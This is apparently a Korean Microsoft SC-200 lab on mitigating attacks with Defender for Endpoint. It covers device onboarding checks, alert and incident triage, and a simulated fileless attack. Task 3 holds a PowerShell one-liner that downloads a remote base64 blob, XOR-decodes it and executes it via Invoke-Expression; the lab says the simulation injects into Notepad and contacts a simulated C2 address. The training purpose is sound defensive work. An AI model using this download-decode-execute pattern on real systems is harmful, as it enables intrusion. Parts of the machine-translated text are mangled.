---
lab:
  title: 연습 2 - 엔드포인트용 Microsoft Defender를 사용하여 공격 완화
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# 학습 경로 2 - 랩 1 - 연습 2 - 엔드포인트용 Microsoft Defender를 사용하여 위협 완화

## 랩 시나리오

![랩 개요입니다.](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

여러분은 엔드포인트용 Microsoft Defender를 구현하고 있는 회사에서 일하는 보안 운영 분석가입니다. 관리자는 몇 가지 디바이스를 온보딩하여 SecOps(Security Operations) 팀 응답 프로시저에 필요한 변경 내용에 대한 인사이트를 제공할 계획입니다.

엔드포인트용 Defender 공격 완화 기능을 탐색하려면 디바이스 온보딩에 성공했는지 확인하고 해당 프로세스 중에 생성된 경고 및 인시던트에 대해 조사합니다.

>**참고:** **[대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 사용하여 이 랩을 원하는 속도로 클릭할 수 있습니다. 대화형 시뮬레이션과 호스트된 랩 간에 약간의 차이가 있을 수 있지만 보여주는 핵심 개념과 아이디어는 동일합니다.

### 작업 1: 디바이스 온보딩 확인

이 작업에서는 디바이스가 성공적으로 온보딩되었는지 확인하고 테스트 경고를 만듭니다.

1. Microsoft Edge 브라우저의 Microsoft Defender XDR 포털에 아직 없는 경우 테넌트에 대한 관리(로 로그인)https://security.microsoft.com)합니다.

1. 왼쪽 메뉴**의 자산 영역에서 디바이스**를** 선택합니다**. 계속하기 전에 WIN1이 디바이스 페이지에 나타날 때까지 기다려 주세요. 그렇지 않으면, 나중에 생성될 경고를 보기 위해 이 작업을 반복해야 할 수 있습니다.

    >**참고:** 온보딩 프로세스를 완료하고 1시간 후에 디바이스 목록에 디바이스가 표시되지 않으면 온보딩 또는 연결 문제가 표시될 수 있습니다.

1. 왼쪽 메뉴 모음에서 설정** 선택한 **다음 설정 페이지에서 엔드포인트를** 선택합니다**.

1. 디바이스 관리 섹션에서 온보딩을** 선택하고 **"Windows 10 및 11"*이 운영 체제로 선택되어 있는지 확인*합니다. *이제 "온보딩된 첫 번째 디바이스"* 메시지가 완료됨*으로 표시됩니다*.

1. "2" 섹션 *아래로 스크롤합니다. 검색 테스트 실행"*, 복사 단추를 선택하여 검색 테스트 스크립트를 **복사** 합니다.  

1. WIN1 가상 머신의 Windows 검색 창에서 **CMD**를 입력하고 명령 프롬프트 앱의 오른쪽 창에서 **관리자 권한으로 실행**을 선택합니다.

1. “사용자 계정 컨트롤” 창이 표시되면 **예**를 선택하여 앱을 실행할 수 있도록 합니다. 

1. 관리istrator: 명령 프롬프트** 창을 마우스 오른쪽 단추로 클릭하여 **스크립트를 붙여넣고 Enter** 키를 눌러 **실행합니다.

    >**참고:** 스크립트를 성공적으로 실행한 후 몇 분 후에 Microsoft Defender XDR 포털에서 경고가 생성되면 창이 자동으로 닫힙니다.

### 작업 2: 경고 및 인시던트 조사

이 태스크에서는 이전 태스크의 온보딩 검색 테스트 스크립트에서 생성된 경고 및 인시던트에 대해 조사합니다.

1. Microsoft Defender XDR 포털**의 왼쪽 메뉴 모음에서 인시던트 및 경고를** 선택한 다음 경고를 선택합니다****.

1. **경고** 창에서 의심스러운 PowerShell 명령줄*이라는 *경고를 선택하여 세부 정보를 로드합니다.

1. *경고 스토리* 타임라인 검토한 다음 세부 정보* 및 *권장 사항* 탭을 검토*합니다.

    >**참고:** 경고 세부 정보* 탭에서 인시던트 세부 정보* 섹션까지 *아래로 스크롤하고 하나의 엔드포인트* 링크에서 실행 인시던트(Execution Incident)를 선택하여 *인시던트 열기를 *선택할 수 있습니다.

1. Microsoft Defender XDR 포털**의 왼쪽 메뉴 모음에서 인시던트** 및 경고를 선택한 다음, 인시던트 선택 ****

1. 한 엔드포인트*에서 실행 인시던트라는 *새 인시던트가 오른쪽 창에 있습니다. 인시던트 이름을 선택하여 세부 정보를 로드합니다.

1. 인시던**트 **관리 링크(연필 아이콘 포함)를 선택하면 새 창 블레이드가 나타납니다.

1. 인시던트 태그 아래에 **"시뮬레이션"을** 입력하고 시뮬레이션(새로 만들기)**을 선택하여 **새 태그를 만듭니다.

1. **내게 할당** 토글을 선택하여 사용자 계정(Me)을 인시던트 소유자로 추가합니다.

1. **분류** 아래에서 드롭다운 메뉴를 확장합니다.

1. **정보, 예상 작업**에서 **보안 테스트**를 선택합니다.

1. 원하는 경우 메모를 추가하고 저장**을 선택하여 인시던트 업데이트 및 완료를 선택합니다**.

1. 공격 스토리, 경고, 자산, 조사, 증거 및 대응* 및 *요약* 탭의 내용을 *검토합니다. 디바이스 및 사용자가 자산 탭 아래에 *있습니다*. 실제 인시던트에서 *공격 스토리* 탭에는 인시던트 그래프*가 *표시됩니다. **힌트:** 표시 크기 때문에 일부 탭이 숨겨질 수 있습니다. 줄임표 탭(...)을 선택하여 해당 탭을 표시합니다.

### 작업 3 공격 시뮬레이션

>**경고:** 이 시뮬레이션된 공격은 연습을 통해 학습하는 훌륭한 소스입니다. 과정 제공 Azure 테넌트 사용 시 이 랩에 제공된 지침에서만 공격을 수행합니다.  이 테넌트에서 *이 교육 과정을 완료한 후* 다른 시뮬레이션된 공격을 수행할 수 있습니다.

이 작업에서는 WIN1 가상 머신에 대한 공격을 시뮬레이션하고 엔드포인트용 Microsoft Defender 공격을 감지하고 완화했는지 확인합니다.

1. WIN1 가상 머신에서 시작** 단추를 마우스 오른쪽 단추로 클릭하고 *** Windows PowerShell(관리)**을 선택합니다**. * 

1. “사용자 계정 컨트롤” 창이 표시되면 **예**를 선택하여 앱을 실행할 수 있도록 합니다.

1. 다음 시뮬레이션 스크립트를 복사하여 PowerShell 창에 붙여넣고 Enter** 키를 눌러 **실행합니다.

    ```PowerShell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```

    >**참고:** 스크립트를 실행하는 동안 오류가 발생하는 경우 메모장 앱을 열고 스크립트를 빈 파일로 복사할 수 있습니다. 메모장 단어 줄 바꿈*이 켜져 있는지 확인*합니다. PowerShell에서 스크립트의 각 줄을 개별적으로 복사하고 실행합니다.

1. 스크립트는 여러 줄의 출력과 do기본 컨트롤러를 확인하지 못했다는 메시지를 *생성합니다기본*. 몇 초 후에 *메모장* 앱이 열립니다. 시뮬레이션된 공격 코드가 메모장 삽입됩니다. 자동으로 생성된 메모장 인스턴스를 열어 두면 전체 시나리오를 경험할 수 있습니다. 시뮬레이션된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이션)와 통신하려고 시도합니다.

### 작업 4: 시뮬레이션된 공격을 단일 인시던트로 조사

1. Microsoft Defender XDR 포털**의 왼쪽 메뉴 모음에서 인시던트** 및 경고를 선택한 다음, 인시던트 선택 ****

1. 한 엔드포인트*에서 방어 회피 및 검색과 관련된 다단계 인시던트라는 *새 인시던트가 오른쪽 창에 있습니다. 인시던트 이름을 선택하여 세부 정보를 로드합니다.

1. *공격 스토리* 탭에서 경고** 및 **인시던트 세부 정보** 창을 축소**하여 전체 **인시던트 그래프**를 봅니다.

1. 인시던트 그래프 노드를 **마우스로 가리키고 선택하여 엔터티를 *검토합니다*.**

1. 경고 창(왼쪽)을 **** 다시 확장하고 공격 스토리** *실행* 재생 아이콘을 **선택합니다. 경고별 공격 타임라인 경고를 표시하고 인시던트 그래프*를 *동적으로 채웁니다.

1. 공격 스토리, 경고, 자산, 조사, 증거 및 대응* 및 *요약* 탭의 내용을 *검토합니다. 디바이스 및 사용자가 자산 탭 아래에 *있습니다* . **힌트:** 표시 크기 때문에 일부 탭이 숨겨질 수 있습니다. 줄임표 탭(...)을 선택하여 해당 탭을 표시합니다.

1. 증거 **및 응답** 탭에서 IP 주소를** 선택한 **다음, 표시된 *IP 주소를* 선택합니다. 팝업 창에서 IP 주소 세부 정보를 검토하고 아래로 스크롤하여 IP 주소 페이지** 열기 단추를 선택합니다**.

1. 조직 탭에서 *IP 주소* 페이지 *개요, 인시던트 및 경고 및 관찰됨의 내용을 검토* 합니다. 일부 탭에는 IP 주소에 대한 정보가 포함되지 않을 수 있습니다.

## 이 랩을 완료했습니다.
